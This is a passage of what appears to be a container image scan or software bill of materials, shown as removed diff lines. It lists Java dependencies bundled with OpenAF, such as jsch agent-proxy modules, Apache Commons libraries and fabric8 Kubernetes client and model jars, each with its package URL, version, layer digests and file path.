-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [17]  ╭ Name      : com.jcraft:jsch.agentproxy.core 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.core@0.0.9 
-      │                 │       │            ╰ UID : afb96fc5c6b4a255 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [18]  ╭ Name      : com.jcraft:jsch.agentproxy.jsch 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.jsch@0.0.9 
-      │                 │       │            ╰ UID : 8066e61c44eb14ea 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [19]  ╭ Name      : com.jcraft:jsch.agentproxy.pageant 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.pageant@0.0.9 
-      │                 │       │            ╰ UID : c0284278b99b17bc 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [20]  ╭ Name      : com.jcraft:jsch.agentproxy.sshagent 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.sshagent@0.0.9 
-      │                 │       │            ╰ UID : bd9e5fa40773f9dc 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [21]  ╭ Name      : com.jcraft:jsch.agentproxy.svnkit-trilead-ssh2 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.svnkit-trilead-ssh2@0
-      │                 │       │            │       .0.9 
-      │                 │       │            ╰ UID : 4bc35c3b9b6add62 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [22]  ╭ Name      : com.jcraft:jsch.agentproxy.usocket-jna 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.usocket-jna@0.0.9 
-      │                 │       │            ╰ UID : c30290a3390d8666 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [23]  ╭ Name      : com.jcraft:jsch.agentproxy.usocket-nc 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.usocket-nc@0.0.9 
-      │                 │       │            ╰ UID : 48390e4cf4a3666a 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [24]  ╭ Name      : com.sun.activation:javax.activation 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.sun.activation/javax.activation@1.2.0 
-      │                 │       │            ╰ UID : 76398eb1d6d13adc 
-      │                 │       ├ Version   : 1.2.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [25]  ╭ Name      : com.sun.mail:javax.mail 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.sun.mail/javax.mail@1.6.2 
-      │                 │       │            ╰ UID : 1e7beb37baabc57a 
-      │                 │       ├ Version   : 1.6.2 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [26]  ╭ Name      : com.warrenstrange:googleauth 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.warrenstrange/googleauth@1.5.0 
-      │                 │       │            ╰ UID : 99ee628fb0243c8d 
-      │                 │       ├ Version   : 1.5.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [27]  ╭ Name      : commons-cli:commons-cli 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-cli/commons-cli@1.11.0 
-      │                 │       │            ╰ UID : 3475d2ee4b04dbe0 
-      │                 │       ├ Version   : 1.11.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [28]  ╭ Name      : commons-codec:commons-codec 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-codec/commons-codec@1.21.0 
-      │                 │       │            ╰ UID : 2426b259c63a1b24 
-      │                 │       ├ Version   : 1.21.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [29]  ╭ Name      : commons-io:commons-io 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-io/commons-io@2.21.0 
-      │                 │       │            ╰ UID : 2061cef217097cbb 
-      │                 │       ├ Version   : 2.21.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [30]  ╭ Name      : commons-logging:commons-logging 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-logging/commons-logging@1.3.6 
-      │                 │       │            ╰ UID : 2ad3f2cbc57ed9d5 
-      │                 │       ├ Version   : 1.3.6 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [31]  ╭ Name      : commons-net:commons-net 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-net/commons-net@3.12.0 
-      │                 │       │            ╰ UID : f30479acbb8d626f 
-      │                 │       ├ Version   : 3.12.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [32]  ╭ Name      : de.vandermeer:asciilist-j7 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/de.vandermeer/asciilist-j7@1.0.0 
-      │                 │       │            ╰ UID : 5d38f221ce7d2a1 
-      │                 │       ├ Version   : 1.0.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [33]  ╭ Name      : de.vandermeer:asciitable-j7 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/de.vandermeer/asciitable-j7@1.0.1 
-      │                 │       │            ╰ UID : 4ec0aaacbd72cc14 
-      │                 │       ├ Version   : 1.0.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [34]  ╭ Name      : dnsjava:dnsjava 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/dnsjava/dnsjava@3.6.4 
-      │                 │       │            ╰ UID : 7aac8b1c2f9d99a1 
-      │                 │       ├ Version   : 3.6.4 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [35]  ╭ Name      : io.fabric8:kubernetes-client 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-client@7.6.1 
-      │                 │       │            ╰ UID : 7a1af2167e01c22a 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-client-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [36]  ╭ Name      : io.fabric8:kubernetes-client-api 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-client-api@7.6.1 
-      │                 │       │            ╰ UID : 468622c9bc901899 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-client-api-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [37]  ╭ Name      : io.fabric8:kubernetes-httpclient-vertx 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-httpclient-vertx@7.6.1 
-      │                 │       │            ╰ UID : 11eccf3c064d4ac7 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-httpclient-vertx-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [38]  ╭ Name      : io.fabric8:kubernetes-model-admissionregistration 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-admissionregistratio
-      │                 │       │            │       n@7.6.1 
-      │                 │       │            ╰ UID : 258f11a1ddbbeb52 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-admissionregistration-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [39]  ╭ Name      : io.fabric8:kubernetes-model-apiextensions 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-apiextensions@7.6.1 
-      │                 │       │            ╰ UID : d94960c2c0f9ad90 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-apiextensions-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [40]  ╭ Name      : io.fabric8:kubernetes-model-apps 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-apps@7.6.1 
-      │                 │       │            ╰ UID : 4a742b22335668fa 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-apps-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [41]  ╭ Name      : io.fabric8:kubernetes-model-autoscaling 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-autoscaling@7.6.1 
-      │                 │       │            ╰ UID : 1bcdf924b2ec1259 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-autoscaling-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [42]  ╭ Name      : io.fabric8:kubernetes-model-batch 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-batch@7.6.1 
-      │                 │       │            ╰ UID : e2cb3349c5c65795 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-batch-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [43]  ╭ Name      : io.fabric8:kubernetes-model-certificates 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-certificates@7.6.1 
-      │                 │       │            ╰ UID : 98ce726d4a3489fe 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-certificates-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [44]  ╭ Name      : io.fabric8:kubernetes-model-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-common@7.6.1 
-      │                 │       │            ╰ UID : 62c70b9ec22d2053 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-common-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [45]  ╭ Name      : io.fabric8:kubernetes-model-coordination 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-coordination@7.6.1 
-      │                 │       │            ╰ UID : ca7b596b77bf081c 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-coordination-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [46]  ╭ Name      : io.fabric8:kubernetes-model-core 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-core@7.6.1 
-      │                 │       │            ╰ UID : b5c91f9a79562117 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-core-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [47]  ╭ Name      : io.fabric8:kubernetes-model-discovery 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-discovery@7.6.1 
-      │                 │       │            ╰ UID : 20ae8e9fdba15d 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-discovery-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [48]  ╭ Name      : io.fabric8:kubernetes-model-events 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-events@7.6.1 
-      │                 │       │            ╰ UID : 6726e1338d377c10 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-events-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [49]  ╭ Name      : io.fabric8:kubernetes-model-extensions 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-extensions@7.6.1 
-      │                 │       │            ╰ UID : d66d82d1529da9f7 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-extensions-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [50]  ╭ Name      : io.fabric8:kubernetes-model-flowcontrol 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-flowcontrol@7.6.1 
-      │                 │       │            ╰ UID : 245fda9fbe5cf3f2 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-flowcontrol-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [51]  ╭ Name      : io.fabric8:kubernetes-model-gatewayapi 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-gatewayapi@7.6.1 
-      │                 │       │            ╰ UID : 58f23eb0eaff6a62 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-gatewayapi-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [52]  ╭ Name      : io.fabric8:kubernetes-model-metrics 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-metrics@7.6.1 
-      │                 │       │            ╰ UID : c2e013a80d8973fa 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-metrics-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [53]  ╭ Name      : io.fabric8:kubernetes-model-networking 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-networking@7.6.1 
-      │                 │       │            ╰ UID : f01e540bc37ff3b1 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-networking-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [54]  ╭ Name      : io.fabric8:kubernetes-model-node 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-node@7.6.1 
-      │                 │       │            ╰ UID : a14267b1835c244b 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-node-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [55]  ╭ Name      : io.fabric8:kubernetes-model-policy 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-policy@7.6.1 
-      │                 │       │            ╰ UID : 7960f2ecf5819f36 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-policy-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [56]  ╭ Name      : io.fabric8:kubernetes-model-rbac 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-rbac@7.6.1 
-      │                 │       │            ╰ UID : 1205058b35fe8e3e 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-rbac-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
